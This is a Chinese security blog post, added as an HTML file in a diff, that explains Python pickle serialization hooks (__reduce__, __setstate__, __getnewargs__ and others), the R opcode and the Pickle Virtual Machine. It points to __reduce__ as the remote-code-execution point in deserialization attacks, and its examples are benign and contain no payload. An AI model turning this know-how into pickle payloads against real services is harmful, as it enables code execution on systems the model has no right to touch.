@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>pickle反序列化 - 天下同春</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="pickle反序列化 - 天下同春" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2024/02/26/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html" />
+  
+  <meta property="og:image" content="/img/parti.jpg" />
+  
+  <meta property="og:article:published_time" content="2024-02-26T11:00:08.000Z" />
+  
+  <meta property="og:article:author" content="void2eye" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+    <script src='https://unpkg.com/@waline/client@v2/dist/waline.js'></script>
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/@waline/client@v2/dist/waline.css"
+    />
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">天下同春</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/">Home</a>
+            
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/void2eye" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/Web/">Web</a>
+        
+            <a href="/categories/Web/python/">python</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>February</span>
+            <span>26,</span>
+            <span>2024</span>
+        </div>
+        
+
+        <h1 class="title">pickle反序列化</h1>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="pickle简介"><a href="#pickle简介" class="headerlink" title="pickle简介"></a>pickle简介</h1><ul>
+<li>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</li>
+<li>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</li>
+<li>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</li>
+<li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li>
+</ul>
+<h2 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h2><p>使用 <code>pickle</code> 序列化时，可以处理以下对象：</p>
+<ul>
+<li><p><strong>基本类型</strong>: <code>None</code>、<code>True</code>、<code>False</code>、整数、浮点数、复数</p>
+</li>
+<li><p><strong>字符串和字节数据</strong>: <code>str</code>、<code>bytes</code>、<code>bytearray</code></p>
+</li>
+<li><p><strong>集合类型</strong>: 只包含可封存对象的 <code>tuple</code>、<code>list</code>、<code>set</code> 和 <code>dict</code></p>
+</li>
+<li><p>函数和类</p>
+<p>定义在模块最外层的函数和类</p>
+<ul>
+<li>例如，通过 <code>def</code> 定义的函数和通过 <code>class</code> 定义的类，可以通过 <code>pickle</code> 序列化和反序列化。</li>
+<li>但匿名函数（<code>lambda</code>）不支持，因为它们不能被引用为独立的模块属性。</li>
+</ul>
+</li>
+<li><p>自定义类的实例</p>
+<ul>
+<li>只要类对象定义在模块的全局作用域上，并且其属性（例如 <code>__dict__</code>）也可序列化，<code>pickle</code> 就能处理这些实例。</li>
+<li>另外，类还可以通过实现 <code>__getstate__</code> 和 <code>__setstate__</code> 方法，来自定义序列化和反序列化行为。</li>
+</ul>
+</li>
+</ul>
+<h2 id="关于模块"><a href="#关于模块" class="headerlink" title="关于模块"></a>关于模块</h2><p>在Python中，<strong>模块（module）</strong> 是一个包含Python代码的文件，其扩展名通常为<code>.py</code>。每个模块都定义了一个命名空间，里面可以包含变量、函数、类等。模块可以通过<code>import</code>语句引入到其他Python代码中，以便使用其中定义的内容。</p>
+<p>在模块的全局作用域中定义的函数（通过 <code>def</code>）和类（通过 <code>class</code>）是可以被 <code>pickle</code> 序列化和反序列化的。</p>
+<p>当 <code>pickle</code> 反序列化一个对象时，它依赖于该对象的<strong>全限定名</strong>（fully qualified name），也就是模块名+函数名或类名。这样，<code>pickle</code> 在反序列化时，能通过模块名找到函数或类的定义。</p>
+<h2 id="object-reduce-self-函数"><a href="#object-reduce-self-函数" class="headerlink" title="object.__reduce__(self) 函数"></a><code>object.__reduce__(self)</code> 函数</h2><p>在开发自定义类时，可以通过重写 <code>object.__reduce__()</code> 方法来自定义序列化行为。</p>
+<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p> object.<em>_reduce</em>_()返回一个元组 (callable, (args, …), state)pikle在反序列化时会根据这个元组来重建对象：</p>
+<ul>
+<li><p><code>callable</code> 是一个可调用对象（通常是构造函数），用于创建新实例。</p>
+</li>
+<li><p><code>(args, ...)</code> 是传递给 <code>callable</code> 的参数。注意，必须是<strong>元组</strong></p>
+</li>
+<li><p><code>state</code> 是额外的信息（可选），用于恢复对象的内部状态。可以是列表或者字典。</p>
+</li>
+<li><p>例如，当对象被反序列化时，会先调用 <code>callable(*args)</code> 生成对象实例，然后根据 <code>state</code> 进一步调整对象状态。</p>
+</li>
+</ul>
+<blockquote>
+<p>注意这里就是rce的点了，可调用对象有很多。</p>
+</blockquote>
+<h2 id="reduce-ex-self-protocol"><a href="#reduce-ex-self-protocol" class="headerlink" title="__reduce_ex__(self, protocol)"></a>__reduce_ex__(self, protocol)</h2><p><strong>功能</strong>：这是 <code>__reduce__()</code> 的一个更通用的版本，支持传入 <code>protocol</code> 参数。<code>protocol</code> 表示序列化时使用的 pickle 协议版本。</p>
+<p><strong>何时使用</strong>：当你希望根据不同的 <code>pickle</code> 协议版本调整序列化行为时，可以使用 <code>__reduce_ex__()</code> 方法。<code>pickle</code> 模块会优先调用 <code>__reduce_ex__()</code>，如果未定义这个方法，才会调用 <code>__reduce__()</code>。</p>
+<blockquote>
+<p>注意他会优先调用</p>
+</blockquote>
+<h2 id="getstate-self"><a href="#getstate-self" class="headerlink" title="__getstate__(self)"></a>__getstate__(self)</h2><p><strong>功能</strong>：这个方法用于返回对象的内部状态，<code>pickle</code> 在序列化对象时会调用它。通常返回的状态是一个可序列化的对象，比如字典、列表、元组等，表示对象的内部数据。</p>
+<blockquote>
+<p>有点像__wake_up()</p>
+</blockquote>
+<p><strong>何时使用</strong>：当你想要控制对象序列化时的状态，可以使用 <code>__getstate__()</code> 方法。你可以选择性地排除不需要序列化的属性或者动态计算需要序列化的状态。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">        <span class="variable language_">self</span>.secret = <span class="string">&quot;secret_value&quot;</span>  <span class="comment"># 不想被序列化的属性</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回对象的状态，去掉了 secret</span></span><br><span class="line">        state = <span class="variable language_">self</span>.__dict__.copy()</span><br><span class="line">        <span class="keyword">del</span> state[<span class="string">&#x27;secret&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> state</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="object-setstate-self"><a href="#object-setstate-self" class="headerlink" title="object._setstate_(self)"></a>object.<em>_setstate</em>_(self)</h2><p>在反序列化后自动调用，用于恢复对象的额外状态。</p>
+<p><strong>功能</strong>：当对象被反序列化时，<code>pickle</code> 会调用 <code>__setstate__()</code>，并将 <code>state</code> 作为参数传递进来。这个 <code>state</code> 通常是由 <code>__getstate__()</code> 返回的状态。</p>
+<p><strong>何时使用</strong>：如果你想要自定义对象在反序列化时的重建过程，或者需要重新设置某些属性，可以使用 <code>__setstate__()</code> 方法。</p>
+<blockquote>
+<p>destruct() XD</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">        <span class="variable language_">self</span>.secret = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="comment"># 自定义反序列化时的行为，恢复对象状态</span></span><br><span class="line">        <span class="variable language_">self</span>.__dict__.update(state)</span><br><span class="line">        <span class="variable language_">self</span>.secret = <span class="string">&quot;restored_secret&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>__setstate__()</code> 方法在对象反序列化时恢复对象状态，并重新赋值 <code>secret</code>。</p>
+<h2 id="getnewargs-self"><a href="#getnewargs-self" class="headerlink" title="__getnewargs__(self)"></a>__getnewargs__(self)</h2><p><strong>功能</strong>：这个方法允许你为对象的反序列化返回一个用于 <code>__new__()</code> 的参数元组。它控制对象在反序列化时，传递给 <code>__new__()</code> 方法的参数。</p>
+<p><strong>何时使用</strong>：如果你的类需要通过 <code>__new__()</code> 来创建对象，并且这个对象初始化时需要特定的参数（而不仅仅是 <code>__init__()</code>），你可以使用 <code>__getnewargs__()</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回的参数将被传递给 __new__</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.value,)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="getnewargs-ex-self"><a href="#getnewargs-ex-self" class="headerlink" title="__getnewargs_ex__(self)"></a>__getnewargs_ex__(self)</h2><ul>
+<li><strong>功能</strong>：类似于 <code>__getnewargs__()</code>，但它可以返回一个包含位置参数和关键字参数的元组，分别传递给 <code>__new__()</code> 方法。</li>
+<li><strong>何时使用</strong>：当你希望在对象反序列化时，既能传递位置参数，又能传递关键字参数时，使用 <code>__getnewargs_ex__()</code> 方法。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value, name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs_ex__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回用于 __new__ 的位置参数和关键字参数</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.value,), &#123;<span class="string">&#x27;name&#x27;</span>: <span class="variable language_">self</span>.name&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="new-cls-args-kwargs"><a href="#new-cls-args-kwargs" class="headerlink" title="__new__(cls, *args, **kwargs)"></a>__new__(cls, *args, **kwargs)</h2><p><strong>功能</strong>：<code>__new__()</code> 是用于创建类实例的构造器方法，它在对象创建时会被首先调用。<code>pickle</code> 在反序列化时有时会调用 <code>__new__()</code> 来创建新的对象，而不是通过 <code>__init__()</code>。</p>
+<p><strong>何时使用</strong>：当类的实例需要自定义的创建行为时，<code>__new__()</code> 非常有用，特别是当对象需要被反序列化时，必须通过特殊的方式创建。</p>
+<p><code>__new__()</code> 是用来<strong>创建对象</strong>的静态方法，它在对象初始化之前被调用。<code>__new__()</code> 方法负责分配内存，并返回一个新的对象实例。在 Python 中，<code>__new__()</code> 通常只用于不可变对象（如 <code>int</code>、<code>str</code>、<code>tuple</code>），因为这些对象在创建后不能被修改，必须通过 <code>__new__()</code> 返回新的实例。</p>
+<p>详解：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="comment"># 创建并返回一个新对象</span></span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="comment"># 初始化对象的属性</span></span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="详解-new"><a href="#详解-new" class="headerlink" title="详解__new__()"></a>详解__new__()</h2><p>首先明确一点：</p>
+<p>在 Python 中，类的实例化分为两步：<strong>创建对象</strong> 和 <strong>初始化对象</strong>。<code>__new__()</code> 和 <code>__init__()</code> 分别负责这两部分。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="comment"># 创建并返回一个新对象</span></span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="comment"># 初始化对象的属性</span></span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>例子一目了然</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, x, y</span>):</span><br><span class="line">        <span class="comment"># 创建一个新的实例，并设置属性</span></span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="comment"># 使用 __new__ 设置属性，确保不可变性</span></span><br><span class="line">        instance._x = x</span><br><span class="line">        instance._y = y</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="comment"># 因为属性已经在 __new__ 中设置，所以这里不需要做任何事情</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">x</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._x</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">y</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回传递给 __new__ 的参数，以便反序列化时重建对象</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>._x, <span class="variable language_">self</span>._y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化一个 Point 对象</span></span><br><span class="line">point = Point(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 pickle 序列化和反序列化 Point 对象</span></span><br><span class="line">serialized_point = pickle.dumps(point)</span><br><span class="line">deserialized_point = pickle.loads(serialized_point)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查反序列化后的对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Point: (<span class="subst">&#123;deserialized_point.x&#125;</span>, <span class="subst">&#123;deserialized_point.y&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们在 <code>__new__()</code> 方法中创建了 <code>Point</code> 对象，并设置了 <code>_x</code> 和 <code>_y</code> 属性。这样，<code>__init__()</code> 就不会修改这些属性，确保对象是不可变的（虽然在 Python 中的严格不可变性需要更多的措施，比如通过 <code>__slots__</code> 限制修改，但此处已展示核心思想）。</p>
+<blockquote>
+<p>虽然定义了 <code>__init__()</code>，但它没有实际做任何操作，因为对象的属性已经在 <code>__new__()</code> 中设置好了。这样可以避免初始化时再次修改属性。</p>
+</blockquote>
+<p>**<code>__getnewargs__()</code>**：</p>
+<ul>
+<li><code>__getnewargs__()</code> 返回一个包含 <code>_x</code> 和 <code>_y</code> 的元组，表示反序列化时，应该将这些参数传递给 <code>__new__()</code>，以便重新创建对象。</li>
+<li>这个方法在 <code>pickle</code> 反序列化时被调用，用于确保 <code>__new__()</code> 能够接收到正确的参数并重建对象。</li>
+</ul>
+<p>对象在正常使用过程中是不可变的，但通过特殊的机制（如 <code>pickle</code> 的反序列化），对象的内部状态可以被“重新构建”或“重设”。这是因为 <code>pickle</code> 在反序列化时调用了 <code>__new__()</code> 和 <code>__getnewargs__()</code> 等特殊方法，允许对象被重新创建。</p>
+<p>改一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, x, y</span>):</span><br><span class="line">        <span class="comment"># 创建一个新的实例，并设置属性</span></span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        instance._x = x</span><br><span class="line">        instance._y = y</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># 属性已经在 __new__ 中设置，所以这里不做任何操作</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">x</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._x</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">y</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回传递给 __new__ 的参数，pickle 在反序列化时会调用它</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>._x, <span class="variable language_">self</span>._y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化一个 Point 对象</span></span><br><span class="line">point = Point(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Original Point: (<span class="subst">&#123;point.x&#125;</span>, <span class="subst">&#123;point.y&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 pickle 序列化 Point 对象</span></span><br><span class="line">serialized_point = pickle.dumps(point)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Point 反序列化</span></span><br><span class="line">deserialized_point = pickle.loads(serialized_point)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Deserialized Point: (<span class="subst">&#123;deserialized_point.x&#125;</span>, <span class="subst">&#123;deserialized_point.y&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义修改后的类，通过 __getnewargs__ 修改反序列化时的属性</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ModifiedPoint</span>(<span class="title class_ inherited__">Point</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getnewargs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 在反序列化时返回不同的参数以修改属性</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化 ModifiedPoint 对象并反序列化，确保在序列化和反序列化时使用 ModifiedPoint 类</span></span><br><span class="line">modified_point = ModifiedPoint(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line">serialized_modified_point = pickle.dumps(modified_point)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化 ModifiedPoint 对象</span></span><br><span class="line">deserialized_modified_point = pickle.loads(serialized_modified_point)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Modified Point: (<span class="subst">&#123;deserialized_modified_point.x&#125;</span>, <span class="subst">&#123;deserialized_modified_point.y&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>关键：</p>
+<blockquote>
+<p><strong>不可变对象设计</strong>：通过 <code>__new__()</code> 和属性封装的方式，创建了一个在常规使用中不可修改属性的对象。</p>
+<p><strong>反序列化的特殊性</strong>：<code>pickle</code> 通过 <code>__getnewargs__()</code> 等特殊方法，可以在反序列化时给对象不同的初始参数，允许重新设置对象的属性。尽管对象被设计为不可变，但通过 <code>pickle</code> 序列化和反序列化，我们仍然可以创建带有不同状态的对象。</p>
+</blockquote>
+<blockquote>
+<p>覆盖哦</p>
+</blockquote>
+<blockquote>
+<p>这里已经核心操作了</p>
+<p>ModifiedPoint(Point)</p>
+</blockquote>
+<h4 id="pickle-的-R-操作码"><a href="#pickle-的-R-操作码" class="headerlink" title="pickle 的 R 操作码"></a><code>pickle</code> 的 <code>R</code> 操作码</h4><ul>
+<li>在 <code>pickle</code> 的 opcode 中，<code>R</code> 与 <code>object.__reduce__()</code> 紧密关联。<code>R</code> 操作码在反序列化时会从栈中取出两个值，第一个作为要调用的函数，第二个是传递给函数的参数元组，然后调用该函数，返回值作为反序列化后的对象。</li>
+<li><code>R</code> 操作符的存在允许我们手动指定一些反序列化行为，使得 <code>pickle</code> 可以解析一些由 <code>object.__reduce__()</code> 生成的复杂对象。</li>
+</ul>
+<h1 id="pickle过程详细解读"><a href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h1><ul>
+<li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li>
+<li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li>
+<li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
+<li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li>
+<li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li>
+</ul>
+<p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/20200320230631-6204866e-6abc-1.gif" alt="20200320230631-6204866e-6abc-1"></p>
+<ul>
+<li>PVM解析 <code>__reduce__()</code> 的过程动图：</li>
+</ul>
+<p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1"></p>
